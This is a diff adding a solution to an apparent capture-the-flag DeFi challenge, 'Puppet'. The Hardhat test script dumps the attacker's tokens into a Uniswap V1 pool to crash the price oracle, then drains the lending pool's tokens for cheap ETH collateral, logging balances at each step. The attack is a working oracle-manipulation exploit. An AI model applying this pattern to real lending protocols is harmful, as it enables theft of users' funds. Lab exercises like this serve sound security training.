@@ -3,6 +3,7 @@ const factoryJson = require("../../build-uniswap-v1/UniswapV1Factory.json");
 
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
+const {BigNumber} = require("ethers");
 
 // Calculates how much ETH (in wei) Uniswap will pay for the given amount of tokens
 function calculateTokenToEthInputPrice(tokensSold, tokensInReserve, etherInReserve) {
@@ -103,6 +104,62 @@ describe('[Challenge] Puppet', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+
+        const showBalances = async (prefix = '') => {
+            console.log(`${prefix} ETH Balance of attacker: `, ethers.utils.formatEther(await ethers.provider.getBalance(attacker.address)));
+            console.log(`${prefix} DVT Balance of attacker: `, ethers.utils.formatEther(await this.token.balanceOf(attacker.address)));
+
+            console.log(`${prefix} ETH Balance of uniswap: `, ethers.utils.formatEther(await ethers.provider.getBalance(this.uniswapExchange.address)));
+            console.log(`${prefix} DVT Balance of uniswap: `, ethers.utils.formatEther(await this.token.balanceOf(this.uniswapExchange.address)));
+
+            console.log(`${prefix} ETH Balance of lender: `, ethers.utils.formatEther(await ethers.provider.getBalance(this.lendingPool.address)));
+            console.log(`${prefix} DVT Balance of lender: `, ethers.utils.formatEther(await this.token.balanceOf(this.lendingPool.address)));
+
+            console.log();
+        };
+        await showBalances("Before");
+
+        const initialTokenBalance = await this.token.balanceOf(attacker.address);
+        const appTxn = await this.token.connect(attacker)
+            .approve(this.uniswapExchange.address, initialTokenBalance);
+        appTxn.wait();
+        console.log(`Approved ${await this.uniswapExchange.address} to spend ${ethers.utils.formatEther(initialTokenBalance)} tokens.`);
+
+        let deadline = (await ethers.provider.getBlock()).timestamp + 1;
+        const swapTxn1 = await this.uniswapExchange.connect(attacker)
+            .tokenToEthSwapInput(
+                initialTokenBalance,
+                ethers.utils.parseEther('1'),
+                deadline
+            );
+        swapTxn1.wait();
+        console.log(`Swapped ${ethers.utils.formatEther(initialTokenBalance)} of ${await this.token.symbol()} for ETH`);
+        await showBalances("After Swap");
+
+        const borrowAmount = await this.token.balanceOf(await this.lendingPool.address);
+        const loanTxn = await this.lendingPool.connect(attacker)
+            .borrow(
+                borrowAmount, {
+                    value: ethers.utils.parseEther( '19.6643298887982')
+                });
+        loanTxn.wait();
+        console.log(`Borrowed ${ethers.utils.formatEther(borrowAmount)} of ${await this.token.symbol()}.`);
+        await showBalances("After Borrow");
+
+        deadline = (await ethers.provider.getBlock()).timestamp + 1;
+        const remainingDeposits =  ethers.utils.parseEther('1000');
+        console.log(`Remaining deposits: ${ethers.utils.formatEther(remainingDeposits)}`);
+        const swapTxn2 = await this.uniswapExchange
+            .connect(attacker)
+            .ethToTokenSwapOutput(
+                remainingDeposits,
+                deadline, {
+                    value: ethers.utils.parseEther('15.236')
+                }
+            );
+        swapTxn2.wait();
+        console.log(`Swapped another 1000 of ${await this.token.symbol()} for ETH`);
+        await showBalances("After Swap #2");
     });
 
     after(async function () {
